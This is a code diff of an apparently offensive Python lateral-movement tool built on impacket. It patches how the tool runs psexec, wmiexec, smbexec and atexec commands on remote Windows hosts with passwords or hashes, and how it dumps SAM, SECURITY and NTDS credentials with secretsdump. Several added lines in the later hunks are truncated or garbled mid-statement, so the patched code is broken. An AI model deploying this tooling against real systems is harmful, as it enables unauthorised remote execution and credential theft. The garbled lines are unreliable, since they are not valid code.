@@ -305,7 +305,10 @@ def smb_server(working_dir):
 def wmi_test(usr, pwd, dom, dst):
     output = None
     dom_usr = dom + "/" + usr
-    wmic = wmi.WmiClientWrapper(username=dom_usr,password=pwd,host=dst)
+    if dom == "WORKGROUP":
+        wmic = wmi.WmiClientWrapper(username=usr,password=pwd,host=dst)
+    else:
+        wmic = wmi.WmiClientWrapper(username=dom_usr,password=pwd,host=dst)
     try:
         output = wmic.query("SELECT * FROM Win32_Processor")
     except:
@@ -478,15 +481,15 @@ Create Pasteable Double Encoded Script:
         if "/" not in cwd:
             cwd = str(os.getcwd())
         payload = os.path.basename(payload)
-    elif delivery == web:
+        payload = ''.join(payload)
+    elif delivery == "web":
         cwd = "/opt/ranger/web"
-    elif deliver == smb:
+    elif deliver == "smb":
         cwd = "/opt/ranger/smb"
         src_port = 445
 
     if aes != None:
         kerberos = True
-    payload = ''.join(payload)
     if filename:
         payload = filename
 
@@ -640,7 +643,7 @@ Create Pasteable Double Encoded Script:
     if psexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd)
+                srv = delivery_server(src_port, cwd, delivery)
                 print("[*] Starting %s server on port %s in %s" ) % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -654,7 +657,7 @@ Create Pasteable Double Encoded Script:
     elif wmiexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd)
+                srv = delivery_server(src_port, cwd, delivery)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -694,7 +697,7 @@ Create Pasteable Double Encoded Script:
     elif smbexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd)
+                srv = delivery_server(src_port, cwd, delivery)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -708,7 +711,7 @@ Create Pasteable Double Encoded Script:
     elif atexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = delivery_server(src_port, cwd)
+                srv = delivery_server(src_port, cwd, delivery)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -719,7 +722,7 @@ Create Pasteable Double Encoded Script:
             attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
             attack.play(dst)
             if attacks and not encoder:
-                srv = delivery_server(src_port, cwd)
+                srv = delivery_server(src_port, cwd, delivery)
                 print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -727,7 +730,7 @@ Create Pasteable Double Encoded Script:
                     print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
                 if command == "cmd.exe":
                     sys.exit("[!] Please provide a viable command for execution")
-                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command)
+                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain
                 attack.play(dst)
             if attacks:
                 srv.terminate()
@@ -735,10 +738,10 @@ Create Pasteable Double Encoded Script:
     elif sam_dump:
         for dst in final_targets:
             if hash:
-                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+                print("[*] Attempting to access the system %s with, user: %s has
             else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
+                print("[*] Attempting to access the system %s with, user: %s pwd
+            attack=secretsdump.DumpSecrets(address = dst, username = usr, passwo                                                                                        tem, security = security, sam = sam, ntds = ntds)
             try:
                 attack.dump()
             except Execption, e:
